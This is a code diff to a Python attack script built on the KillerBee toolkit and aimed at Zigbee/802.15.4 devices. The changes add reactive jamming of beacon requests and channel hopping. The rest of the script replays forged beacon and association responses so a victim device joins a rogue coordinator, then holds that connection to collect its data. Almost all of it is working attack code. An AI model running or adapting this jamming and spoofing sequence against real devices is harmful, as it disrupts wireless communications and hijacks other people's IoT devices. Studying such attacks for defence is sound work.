@@ -10,7 +10,7 @@ from killerbee import *
 BEACON_RESPONSE_LISTEN_TRIES = 10
 
 # Number of channels to increment after jamming
-CHANNEL_INCREMENT = 0
+CHANNEL_INCREMENT = 2
 
 # Beacon request packet (captured via Wireshark)
 BEACON_REQUEST_PKT_BYTES = str(bytearray([
@@ -77,40 +77,17 @@ if __name__ == '__main__':
             kb.sniffer_off()
 
         # Wait for another beacon request
-        print('3. Listening for a beacon request or orphan notification from another device...')
-        got_beacon_request = False
-        counter = 1
-        kb.sniffer_on(args.channel)
-        while not got_beacon_request:
-            packet = kb.pnext()
-            if packet:
-                packet_bytes = bytearray(packet['bytes'])
-                # Beacon requests have 0b011 at the end of their first byte
-                # and 0x07 as their 7th byte
-                if (packet_bytes[0] & 0b111 == 0b011 and (packet_bytes[7] == 0x07 or \
-                        (len(packet_bytes) > 17 and packet_bytes[17] == 0x06))):
-                    print('  Got beacon request or orphan notification.')
-                    got_beacon_request = True
-                else:
-                    print('  Ignoring packet (' + str(counter) + '): not beacon request or orphan notification.')
-                    counter += 1
-        kb.sniffer_off()
+        print('3. Selectively jamming beacon requests for ' + str(JAM_TIME_SEC) + ' seconds.')
+        kb.reactive_jammer_on()
+        time.sleep(JAM_TIME_SEC)
+        kb.reactive_jammer_off()
 
-        #print('4. Jamming channel for ' + str(JAM_TIME_SEC) + ' seconds.')
-        #kb.inject(JAM_PKT_BYTES)
-
-        #kb.jammer_on()
-        #time.sleep(JAM_TIME_SEC)
-        #kb.jammer_off()
-
-        # Increment channel
-        # TODO: Are channel scans incremental from 11 to 26?
-        #new_channel = args.channel + CHANNEL_INCREMENT
-        #print('5. Changing channel from ' + str(args.channel) + ' to ' + str(new_channel) + '.')
-        #kb.set_channel(new_channel)
+        new_channel = args.channel + CHANNEL_INCREMENT
+        print('4. Changing channel from ' + str(args.channel) + ' to ' + str(new_channel) + '.')
+        kb.set_channel(new_channel)
 
         # Wait for another beacon request
-        print('6. Listening for a beacon request from another device...')
+        print('5. Listening for a beacon request from another device...')
         got_beacon_request = False
         kb.sniffer_on()
         br_seq_num = 0
@@ -130,11 +107,11 @@ if __name__ == '__main__':
         beacon_response_bytes[2] = (br_seq_num+1) % 256
 
         # Send forged beacon response
-        print('7. Replaying beacon response.')
+        print('6. Replaying beacon response.')
         kb.inject(beacon_response_bytes)
 
         # Wait for association request
-        print('8. Listening for association request.')
+        print('7. Listening for association request.')
         got_assoc_request = False
         kb.sniffer_on()
         assoc_request_pkt_bytes = None
@@ -169,11 +146,11 @@ if __name__ == '__main__':
                 bytearray([0x02, 0x34, 0x12, 0x00])
 
         # Send forged association response
-        print('9. Sending association response.')
+        print('8. Sending association response.')
         kb.inject(assoc_response_pkt_bytes)
 
         # ACK data requests and note when data was received
-        print('10. Maintaining connection...')
+        print('9. Maintaining connection...')
         while True:
             sniffer_on = False
             packet = None
